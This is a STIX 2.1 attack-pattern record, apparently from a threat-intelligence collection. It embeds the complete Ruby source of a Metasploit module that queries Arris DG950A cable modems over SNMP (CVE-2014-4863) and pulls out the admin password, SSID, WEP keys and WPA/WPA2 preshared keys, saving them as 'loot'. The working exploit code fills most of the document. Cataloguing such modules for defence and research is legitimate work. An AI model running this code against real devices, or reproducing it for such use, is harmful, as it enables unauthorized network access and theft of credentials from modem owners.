{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5fd5c0a6-ac8c-485d-9068-fc91888de05f",
    "created": "2024-08-14T16:27:47.690837Z",
    "modified": "2024-08-14T16:27:47.690841Z",
    "name": "Arris DG950A Cable Modem Wifi Enumeration",
    "description": " This module will extract WEP keys and WPA preshared keys from Arris DG950A cable modems.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/snmp/arris_dg950.rb",
            "external_id": "arris_dg950.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2014/08/21/more-snmp-information-leaks-cve-2014-4862-and-cve-2014-4863/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Arris DG950A Cable Modem Wifi Enumeration',\n      'Description' => %q{\n        This module will extract WEP keys and WPA preshared keys from\n        Arris DG950A cable modems.\n      },\n      'References'  =>\n        [\n          ['CVE','2014-4863'],\n          ['URL', 'https://www.rapid7.com/blog/post/2014/08/21/more-snmp-information-leaks-cve-2014-4862-and-cve-2014-4863/']\n        ],\n      'Author'      => ['Deral \"Percent_X\" Heiland'],\n      'License'     => MSF_LICENSE\n    )\n  end\n\n  def run_host(ip)\n    snmp = connect_snmp\n\n    if snmp.get_value('sysDescr.0') =~ /DG950A/\n      print_line(\"#{ip}\")\n\n      # System Admin Password\n      wifi_info = ''\n      password = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0')\n      print_line(\"Password: #{password}\")\n      wifi_info << \"Password: #{password}\" << \"\\n\"\n    else\n      fail_with(Failure::NoTarget, \"Does not appear to be an Arris DG950A\")\n    end\n\n    # check WPA Encryption Algorithm\n    encrypt_type = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.26.1.1.12')\n    case encrypt_type\n    when 1\n      wpa_encrypt = \"TKIP\"\n    when 2\n      wpa_encrypt = \"AES\"\n    when 3\n      wpa_encrypt = \"TKIP/AES\"\n    else\n      wpa_encrypt = \"Unknown\"\n    end\n\n    # Wifi Status\n    wifi_status = snmp.get_value('1.3.6.1.2.1.2.2.1.8.12')\n    if wifi_status == '1'\n      ssid = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.22.1.2.12')\n      print_line(\"SSID: #{ssid}\")\n      wifi_info << \"SSID: #{ssid}\" << \"\\n\"\n\n      # Wifi Security Settings\n      wifi_version = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.22.1.5.12')\n      if wifi_version == '0'\n        print_line('Open Access Wifi is Enabled')\n        wifi_info << 'Open Access WIFI is Enabled' << '\\n'\n\n      # WEP enabled\n      elsif wifi_version == '1'\n        wep_type = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.23.1.2.12')\n        case wep_type\n        when 1\n          oid = \"1.3.6.1.4.1.4115.1.20.1.1.3.24.1.2.12\"\n        when 2\n          oid = \"1.3.6.1.4.1.4115.1.20.1.1.3.25.1.2.12\"\n        else\n          print_line('FAILED')\n        end\n        wepkey1 = snmp.get_value(\"#{oid}.1\")\n        key1 = \"#{wepkey1}\"\n        print_line(\"WEP KEY1: #{key1}\")\n        wifi_info << \"WEP KEY1: #{key1}\" << \"\\n\"\n        wepkey2 = snmp.get_value(\"#{oid}.2\")\n        key2 = \"#{wepkey2}\"\n        print_line(\"WEP KEY2: #{key2}\")\n        wifi_info << \"WEP KEY2: #{key2}\" << \"\\n\"\n        wepkey3 = snmp.get_value(\"#{oid}.3\")\n        key3 = \"#{wepkey3}\"\n        print_line(\"WEP KEY3: #{key3}\")\n        wifi_info << \"WEP KEY3: #{key3}\" << \"\\n\"\n        wepkey4 = snmp.get_value(\"#{oid}.4\")\n        key4 = \"#{wepkey4}\"\n        print_line(\"WEP KEY4: #{key4}\")\n        wifi_info << \"WEP KEY4: #{key4}\" << \"\\n\"\n\n      # WPA enabled\n      elsif wifi_version == '2'\n        wpapsk = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.26.1.2.12')\n        print_line(\"WPA PSK: #{wpapsk}\")\n        print_line(\"WPA Encryption: #{wpa_encrypt}\")\n        wifi_info << \"WPA PSK: #{wpapsk}\" << \"\\n\"\n        wifi_info << \"WPA Encryption #{wpa_encrypt}\" << \"\\n\"\n\n      # WPA2 enabled\n      elsif wifi_version == '3'\n        wpapsk2 = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.26.1.2.12')\n        print_line(\"WPA2 PSK: #{wpapsk2}\")\n        print_line(\"WPA2 Encryption: #{wpa_encrypt}\")\n        wifi_info << \"WPA2 PSK: #{wpapsk2}\" << \"\\n\"\n        wifi_info << \"WPA2 Encryption: #{wpa_encrypt}\" << \"\\n\"\n\n      # WPA/WPA2 enabled\n      elsif wifi_version == '7'\n        wpawpa2psk = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.26.1.2.12')\n        print_line(\"WPA/WPA2 PSK: #{wpawpa2psk}\")\n        print_line(\"WPA/WPA2 Encryption: #{wpa_encrypt}\")\n        wifi_info << \"WPA/WPA2 PSK: #{wpawpa2psk}\" << \"\\n\"\n        wifi_info << \"WPA/WPA2 Encryption: #{wpa_encrypt}\" << \"\\n\"\n\n      else\n        print_line('FAILED')\n      end\n    else\n      print_line('WIFI is not enabled')\n    end\n\n    # Woot we got loot.\n    loot_name     = 'arris_wifi'\n    loot_type     = 'text/plain'\n    loot_filename = 'arris_wifi.text'\n    loot_desc     = 'Arris DG950A Wifi configuration data'\n    p = store_loot(loot_name, loot_type, datastore['RHOST'], wifi_info, loot_filename, loot_desc)\n    print_good(\"WiFi Data saved in: #{p}\")\n  # No need to make noise\n  rescue ::SNMP::UnsupportedVersion\n  rescue ::SNMP::RequestTimeout\n    raise $ERROR_INFO\n  rescue ::Exception => e\n    print_error(\"#{ip} error: #{e.class} #{e.message}\")\n    disconnect_snmp\n  end\nend\n",
    "x_mitre_contributors": [
        "[Deral \"Percent_X\" Heiland]",
        ""
    ]
}